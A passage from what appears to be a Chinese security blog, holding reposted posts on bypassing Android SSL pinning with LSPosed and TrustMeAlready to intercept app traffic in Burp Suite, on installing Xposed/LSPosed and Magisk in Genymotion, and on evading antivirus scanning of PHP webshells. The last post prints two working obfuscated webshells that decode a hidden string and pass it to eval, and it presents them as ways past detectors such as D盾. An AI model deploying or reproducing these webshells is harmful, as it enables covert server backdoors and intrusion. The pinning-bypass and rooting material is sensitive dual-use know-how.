<h2><span id="0x02-下载安装">0x02 下载安装</span></h2><blockquote>
<p>特别提示：在安装之前需要注意以下几点：</p>
<ul>
<li>LSPosed 项目地址：<a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></li>
<li>TrustMeAlready 项目地址：<a target="_blank" rel="noopener" href="https://github.com/ViRb3/TrustMeAlready/releases">https://github.com/ViRb3/TrustMeAlready/releases</a></li>
<li>系统： Android 8.1 ~ 13</li>
<li>安装 Magisk v23+ (Riru) &#x2F; v24+ (Zygisk)</li>
<li>（针对 Riru 风格）从 Magisk 库安装Riru v25+</li>
<li>在 Magisk 应用程序中下载并安装LSPosed</li>
<li>重启</li>
</ul>
</blockquote>
<h2><span id="0x03-抓包教程">0x03 抓包教程</span></h2><blockquote>
<p>注意：如果用雷电模拟器请使用 9.0.19 或之前的版本，避免不必要的问题发生。</p>
<p>以夜神模拟器为例，添加并运行一个 Android 9 的虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/1.png" alt="image"></p>
<p>在模拟器设置里将虚拟机设置为网络桥接模式、开启 ROOT（默认开启），设置好后重启虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/2.png" alt="image"></p>
<p>在夜神模拟器虚拟机里安装 <code>Magisk.apk</code>、<code>Magisk Terminal Emulato.apk</code>、<code>app-debug.apk</code>（安装成功不显示在主界面）、<code>LSPosed-manager.apk</code>。</p>
<p><img src="/2024/01/22/LSPosed-SSL/3.png" alt="image"></p>
<p>打开 <code>Magisk Terminal Emulator.apk</code>，按照如下步骤操作：输入 m 按回车 &gt; 再输入 y 按回车 &gt; 超级用户授权允许 &gt; 再输入 1 按回车 &gt; 输入 a 按回车 &gt; 再输入 1 按回车 &gt; 完毕。</p>
<p><img src="/2024/01/22/LSPosed-SSL/4.png" alt="image"></p>
<p>上述步骤完成后，重启模拟器，打开 <code>Magisk.apk</code> 可以发现 Magisk 安装成功。</p>
<p><img src="/2024/01/22/LSPosed-SSL/5.png" alt="image"></p>
<p>打开 <code>Magisk.apk</code> &gt; 点击右上角齿轮按钮 &gt; 界面往下滑动，找到 Zygisk 选项打开并重启模拟器虚拟机。</p>
<p><img src="/2024/01/22/LSPosed-SSL/6.png" alt="image"></p>
<p>接着将 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 复制到模拟器文件夹里面。打开 <code>Magisk.apk</code> &gt; 底部模块选项 &gt; 从本地安装 &gt; 选择模拟器文件夹内的 <code>LSPosed-v1.8.6-6712-zygisk-release.zip</code> 卡刷包。</p>
<p><img src="/2024/01/22/LSPosed-SSL/7.png" alt="image"></p>
<p>重启模拟器虚拟机后，打开 <code>LSPosed-manager.apk</code>，可以发现 LSPosed 安装成功了。</p>
<p><img src="/2024/01/22/LSPosed-SSL/8.png" alt="image"></p>
<p>然后在夜神模拟器虚拟机里安装 <code>TrustMeAlready-v1.11.apk</code>，安装这个 apk 主界面图标可能会卡在安装的动画，不必在意，忽略即可。</p>
<p><img src="/2024/01/22/LSPosed-SSL/9.png" alt="image"></p>
<p>接着打开 <code>LSPosed-manager.apk</code> 的底部模块选项，点击 TrustMeAlready，启动模块，选择要测试的 APP。</p>
<p><img src="/2024/01/22/LSPosed-SSL/10.png" alt="image"></p>
<p>使用 BurpSuite 工具开启代理抓包，设置监听地址为同一局域网 IP 地址，端口自定义，不与电脑其他端口冲突使用即可。</p>
<p><img src="/2024/01/22/LSPosed-SSL/11.png" alt="image"></p>
<p>在夜神模拟器手机系统设置中将 WiFi 的代理设置为 BurpSuite 监听器的地址。</p>
<p><img src="/2024/01/22/LSPosed-SSL/12.png" alt="image"></p>
<p>最后，打开要测试的 APP，刷新功能页面，在 BurpSuite 中即可看到抓取的 HTTP&#x2F;HTTPS 网络数据包。</p>
<p><img src="/2024/01/22/LSPosed-SSL/13.png" alt="image"></p>
</blockquote>
<h2><span id="参考文章">参考文章</span></h2><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1688786</a></li>
</ul>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/">
                How to install Xposed/EdXposed/LSPosed + Magisk with Genymotion Desktop?
            </a>
        </h2>
    
    <time>
        Jan 22, 2024
    </time>
    <section class="content">
        <h1><span id="how-to-install-xposedx2fedxposedx2flsposed-magisk-with-genymotion-desktop">How to install Xposed&#x2F;EdXposed&#x2F;LSPosed + Magisk with Genymotion Desktop?</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://support.genymotion.com/hc/en-us/articles/360010853198-How-to-install-Xposed-EdXposed-LSPosed-Magisk-with-Genymotion-Desktop-">Genymotion Help Center</a> 并作补充</p>
<p><strong>Warning</strong></p>
<p>GENYMOBILE assumes no liability whatsoever resulting from the download, install and use of Xposed, EdXposed, LSPosed and Magisk. <strong>Use at your own risk.</strong></p>
<p><strong>Note</strong></p>
<p>Because Xposed and EdXposed are no longer maintained, we strongly recommend not using them anymore.</p>
</blockquote>
<h2><span id="android-50-71">Android 5.0 - 7.1</span></h2><h3><span id="prerequisites">Prerequisites</span></h3><blockquote>
<ul>
<li><em>Xposed framework</em></li>
<li><em>Xposed installer</em></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><blockquote>
<ol>
<li>Drag’n drop the Xposed framework zip file (<code>xposed-vXX-sdkXX-x86.zip</code>) to your virtual device display to flash the device.</li>
<li>Drag’n drop Xposed Installer APK (<code>XposedInstaller_*.apk</code>). This should install and launch <em>Xposed Installer</em> application. At this stage, it will display that the Xposed framework is installed but disabled:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/1.png" alt="image"></p>
<ol start="3">
<li><p>Reboot the device with <code>adb reboot</code> command. <strong>Do not reboot from *Xposed Installer* as this will freeze the device.</strong></p>
</li>
<li><p>Launch <em>Xposed installer</em>. It should display “Xposed Framework version XX is active”:</p>
</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/2.png" alt="image"></p>
</blockquote>
<h2><span id="android-80">Android 8.0</span></h2><blockquote>
<p>Xposed only works with Android 5.0 to 7.1. For Android 8.0, you need to use Magisk + Edxposed instead.</p>
</blockquote>
<h3><span id="prerequisites">Prerequisites</span></h3><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Os1feAWtJSVqqs25XIFMyx5oQU-nAhjl/view?usp=sharing">Magisk Manager (Magisk-v23.0.apk)</a> </li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/17N5-c67849_3Z8t656zy9hyVDR449sE5/view?usp=sharing">Magisk framework for x86</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Z46V2oMVRgfL-FAGCCHr-_X4vil6ZZie/view?usp=sharing">Riru Magisk module v.25.4.4</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1611qJFjSkjZl02Ujmr8hzuKaYnT0W6mb/view?usp=sharing">Edxposed Manager 4.6.2</a></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><h4><span id="step-1-install-magisk">Step 1: Install Magisk</span></h4><blockquote>
<ol>
<li>Drag’n Drop Magisk Manager apk: <code>Magisk-v23.0.apk</code>. Magisk Manager will install and open. <em>Close it for now.</em></li>
<li>Drag’n Drop <code>Magisk_rebuilt_1c8ebfac_x86.zip</code> and flash it.</li>
<li>When flashing is complete, reboot the device.</li>
<li>Launch Magisk Manager. It will request ROOT access, select “Remember choice forever” and click Allow:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/3.png" alt="image"></p>
<p>It is possible that the popup opens in the background and is covered by Magisk Manager main window. If so press <strong>back</strong> to access the popup and allow ROOT:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/4.gif" alt="image"></p>
<ol start="5">
<li>You will then be prompted with an update to apply, accept it:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/5.png" alt="image"></p>
<ol start="6">
<li>The device will reboot one more time. Launch Magisk Manager again, you should now be informed that Magisk is now installed in 1c8ebfac(23015) version:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/6.png" alt="image"></p>
</blockquote>
<h4><span id="step-2-install-riru">Step 2: Install Riru</span></h4><blockquote>
<p><strong>Important</strong></p>
<p>Do not install the Riru version available in the Magisk Manager app. Use the old Riru v25 version provided in this article (see prerequisite).</p>
<ol>
<li>Drag’n drop the Riru archive onto the instance display: <code>riru-v25.4.4-release.zip</code>. <strong>Do not flash it!</strong> The archive must be installed from Magisk Manager.</li>
<li>Launch Magisk Manager app and click on the last icon in the bottom toolbar to go to the module section:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/7.png" alt="image"></p>
<ol start="3">
<li>Click “install from storage”:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/8.png" alt="image"></p>
<ol start="4">
<li>Go to the <em>Download</em> folder from the menu:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/9.png" alt="image"></p>
<ol start="5">
<li>Select the Riru archive, <code>riru-v25.4.4-release.zip</code></li>
<li>Reboot the device</li>
</ol>
<p>Riru version 25 should now be present in the installed modules list in Magisk Manager:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/10.png" alt="image"></p>
<p><strong>Important</strong></p>
<p>Make sure NOT to update to Riru v26 as it does not work with EdXposed right now.</p>
</blockquote>
<h4><span id="step-3-install-edxposed">Step 3: Install EdXposed</span></h4><blockquote>
<ol>
<li>You can install EdXposed framework from Magisk Manager. Go to Magisk Manager module manager:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/11.png" alt="image"></p>
<ol start="2">
<li>Open the search widget and input “Edxposed”. Select <strong>Riru - EdXposed</strong>:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/12.png" alt="image"></p>
<ol start="3">
<li>Install the module:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/13.png" alt="image"></p>
<ol start="4">
<li><p>Reboot the device.</p>
</li>
<li><p>Drag’n drop <em>Edxposed manager</em> APK file (<code>EdXposedManager-4.5.7-45700-org.meowcat.edxposed.manager-release.apk</code>) to the device display.</p>
</li>
<li><p>Reboot the device</p>
</li>
</ol>
<p><em>Edxposed manager</em> should launch and display “Edxposed framework is active”:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/14.png" alt="image"></p>
</blockquote>
<h2><span id="android-81-and-above">Android 8.1 and above</span></h2><blockquote>
<p>Edxposed and Xposed are no longer maintained and there are no builds for Android 12 and above.</p>
<p>Instead, we will use LSPosed and Magisk for Android 8.1 and above.</p>
</blockquote>
<h3><span id="prerequisite">Prerequisite</span></h3><blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1Os1feAWtJSVqqs25XIFMyx5oQU-nAhjl/view?usp=sharing">Magisk Manager APK (v23.0)</a> </li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/17N5-c67849_3Z8t656zy9hyVDR449sE5/view?usp=sharing">Magisk framework for x86</a> for Android 8.1 - 10</li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OF8zx6p46t8BcKuO5A6Ncq46zLpFfps-/view?usp=sharing">Magisk framework for x86_64</a> for Android 11 and above (PC or Mac Intel)</li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/14bxIDmOyBKhfeFJfWOWgJNrJ7vDvsUjL/view?usp=sharing">Magisk framework for arm64</a> for mac M1&#x2F;M2</li>
<li><a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases/download/v1.8.6/LSPosed-v1.8.6-6712-riru-release.zip">LSPosed archive</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1OdIoajzfRbDQsniGcPe0Ozvgl3coB_0n/view?usp=drive_link">LSPosed manager APK</a></li>
</ul>
</blockquote>
<h3><span id="installation">Installation</span></h3><h4><span id="step-1-install-magisk">Step 1: Install Magisk</span></h4><blockquote>
<ol>
<li>Drag’n Drop Magisk Manager apk: <code>Magisk-v23.0.apk</code>. Magisk Manager will install and open. <em>Close it for now.</em></li>
<li>Drag’n Drop the flashable archive:<ul>
<li><code>Magisk_rebuilt_1c8ebfac_x86.zip</code> if you use Android 8.1 - 10</li>
<li><code>Magisk_rebuilt_1c8ebfac_x86_64.zip</code> if you use Android 11 and above on a PC or an old Mac Intel</li>
<li><code>Magisk_rebuilt_1c8ebfac_arm64.zip</code> if you use a mac M1&#x2F;M2</li>
</ul>
</li>
<li>When flashing is complete, reboot the device.</li>
<li>Launch Magisk Manager. It will request ROOT access, select “Remember choice forever” and click Allow:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/15.png" alt="image"></p>
<p>It is possible that the popup opens in the background and is covered by Magisk Manager main window. If so press <strong>back</strong> to access the popup and allow ROOT:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/16.gif" alt="image"></p>
<ol start="5">
<li>You will then be prompted with an update to apply, accept it:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/17.png" alt="image"></p>
<ol start="6">
<li>The device will reboot one more time. Launch Magisk Manager again, you should now be informed that Magisk is now installed in 1c8ebfac(23015) version:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/18.png" alt="image"></p>
</blockquote>
<h4><span id="step-2-install-riru">Step 2: Install Riru</span></h4><blockquote>
<p><strong>Important</strong></p>
<p>Do not install the Riru version available in the Magisk Manager app. Use the old Riru v25 version provided in this article (see prerequisite).</p>
<ol>
<li>Drag’n drop the Riru archive onto the instance display: <code>riru-v25.4.4-release.zip</code>. <strong>The flashing process will fail, but this is normal.</strong> The archive must be installed from Magisk Manager.</li>
<li>Launch Magisk Manager app and click on the last icon in the bottom toolbar to go to the module section:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/19.png" alt="image"></p>
<ol start="3">
<li>Click “install from storage”:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/20.png" alt="image"></p>
<ol start="4">
<li>Go to the <em>Download</em> folder from the menu:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/21.png" alt="image"></p>
<ol start="5">
<li><p>Select the Riru archive, <code>riru-v25.4.4-release.zip</code></p>
</li>
<li><p>Reboot the device</p>
</li>
</ol>
<p>Riru version 25 should now be present in the installed modules list in Magisk Manager:</p>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/22.png" alt="image"></p>
</blockquote>
<h4><span id="step-3-install-riru-lsposed">Step 3: Install Riru - LSPosed</span></h4><blockquote>
<ol>
<li>Drag and drop the <a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases/download/v1.8.6/LSPosed-v1.8.6-6712-riru-release.zip">LSPosed archive</a> to the device. <strong>Do not flash it!</strong></li>
<li>Open Magisk Manager, go to the plugin manager page:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/23.png" alt="image"></p>
<ol start="3">
<li>click <em>Install from storage</em> and select <code>LSPosed-v1.8.6-6712-riru-release.zip</code>:</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/24.png" alt="image"></p>
<ol start="4">
<li><p>Reboot the device when prompted</p>
</li>
<li><p>Drag’n Drop <code>LSPosed_manager.apk</code>, LSPosed manager should open:</p>
</li>
</ol>
<p><img src="/2024/01/22/Genymotion-Install-Xposed:EdXposed:LSPosed:Magisk/25.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/EdXposed/" rel="tag">EdXposed</a><a class="tag-none-link" href="/tags/Genymotion/" rel="tag">Genymotion</a><a class="tag-none-link" href="/tags/LSPosed/" rel="tag">LSPosed</a><a class="tag-none-link" href="/tags/Magisk/" rel="tag">Magisk</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2024/01/19/Webshell-Bypass/">
                一些webshell免杀的技巧
            </a>
        </h2>
    
    <time>
        Jan 19, 2024
    </time>
    <section class="content">
        <h1><span id="一些webshell免杀的技巧">一些webshell免杀的技巧</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9290?time__1311=n4+xuDgD9DyDRD0rxfxDqGNQhavn8P2ne4wD">pureqh</a> 并作补充</p>
</blockquote>
<h3><span id="0x00前言">0x00：前言</span></h3><blockquote>
<p>由于杀软的规则在不断更新 所以很多之前的过杀软方法基本上都不行了 而且随着php7逐渐扩张 assert马也将被淘汰 所以本文将提出几种免杀思路 效果很好 而且不会被杀软的正则和沙盒规则约束。</p>
</blockquote>
<h3><span id="0x01自定义加密bypass">0x01：自定义加密Bypass</span></h3><blockquote>
<p>部分杀软会直接将一些编码函数如Base64、编码后的关键字或组合函数加入了规则 比如某dir+</p>
<p><img src="/2024/01/19/Webshell-Bypass/1.png" alt="image"></p>
<p>比如这个 都能被检测出是shell</p>
<p>所以为了防止这种的规则 自定义加密显然是最优解</p>
<p>自定义加密可选性多了 只要能把加密后的字符还原回去就行 比如base32 base58 这类的base编码全家桶 或者自定义ascii移位 甚至是对称加密算法等都是可以绕过这类规则检测</p>
<ul>
<li>base32编码payload<br>（<a target="_blank" rel="noopener" href="https://github.com/pureqh/webshell%EF%BC%89%EF%BC%9A">https://github.com/pureqh/webshell）：</a></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KUYE</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$DAXW</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$LRXV</span> = <span class="literal">null</span>;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;DAXW = <span class="string">&#x27;mv3gc3bierpvat2tkrnxuzlsn5ossoy&#x27;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;LRXV = @<span class="title function_ invoke__">SYXJ</span>(<span class="variable">$this</span>-&gt;DAXW);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*GnSpe=u*/&quot;</span>.<span class="variable language_">$this</span>-&gt;LRXV.<span class="string">&quot;/*GnSpe=u*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">KUYE</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MNWK</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$BASE32_ALPHABET</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz234567&#x27;</span>;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="variable">$v</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">      <span class="variable">$v</span> += <span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">5</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>];</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$vbits</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= (<span class="number">5</span> - <span class="variable">$vbits</span>);</span><br><span class="line">      <span class="variable">$NLHB</span> .= <span class="variable">$BASE32_ALPHABET</span>[<span class="variable">$v</span>];&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SYXJ</span>(<span class="params"><span class="variable">$QSFX</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$NLHB</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="variable">$v</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="variable">$vbits</span> = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>, <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$QSFX</span>); <span class="variable">$i</span> &lt; <span class="variable">$j</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">      <span class="variable">$v</span> &lt;&lt;= <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="title function_ invoke__">ord</span>(<span class="variable">$QSFX</span>[<span class="variable">$i</span>]) - <span class="number">97</span>);</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (<span class="variable">$QSFX</span>[<span class="variable">$i</span>] &gt;= <span class="string">&#x27;2&#x27;</span> &amp;&amp; <span class="variable">$QSFX</span>[<span class="variable">$i</span>] &lt;= <span class="string">&#x27;7&#x27;</span>) &#123;</span><br><span class="line">          <span class="variable">$v</span> += (<span class="number">24</span> + <span class="variable">$QSFX</span>[<span class="variable">$i</span>]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$vbits</span> += <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="variable">$vbits</span> &gt;= <span class="number">8</span>)&#123;</span><br><span class="line">          <span class="variable">$vbits</span> -= <span class="number">8</span>;</span><br><span class="line">          <span class="variable">$NLHB</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &gt;&gt; <span class="variable">$vbits</span>);</span><br><span class="line">          <span class="variable">$v</span> &amp;= ((<span class="number">1</span> &lt;&lt; <span class="variable">$vbits</span>) - <span class="number">1</span>);&#125;&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$NLHB</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/2.png" alt="image"></p>
<ul>
<li>ascii码移位payload（凯撒加密）</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FKPC</span></span>&#123;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;TQYV = <span class="string">&quot;bs^i%!\MLPQXwbolZ&amp;8&quot;</span>;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;WZDM = @<span class="title function_ invoke__">HHGJ</span>(<span class="variable">$this</span>-&gt;TQYV);</span><br><span class="line">      @<span class="keyword">eval</span>(<span class="string">&quot;/*#jkskjwjqo*/&quot;</span>.<span class="variable language_">$this</span>-&gt;WZDM.<span class="string">&quot;/*sj#ahajsj*/&quot;</span>);</span><br><span class="line">      &#125;&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">FKPC</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HHGJ</span>(<span class="params"><span class="variable">$UyGv</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$svfe</span> = [];</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$UyGv</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$f</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable">$svfe</span>[] = <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$f</span>[<span class="variable">$i</span>])+<span class="number">3</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mxAS</span> = <span class="title function_ invoke__">implode</span>(<span class="variable">$svfe</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$mxAS</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/19/Webshell-Bypass/3.png" alt="image"></p>
<p>居然没过webdir+</p>
<p>那如何解决呢 我们后面再说 当然应付D盾还是绰绰有余了</p>
<p><img src="/2024/01/19/Webshell-Bypass/4.png" alt="image"></p>
<p>Rot13加密payload</p>
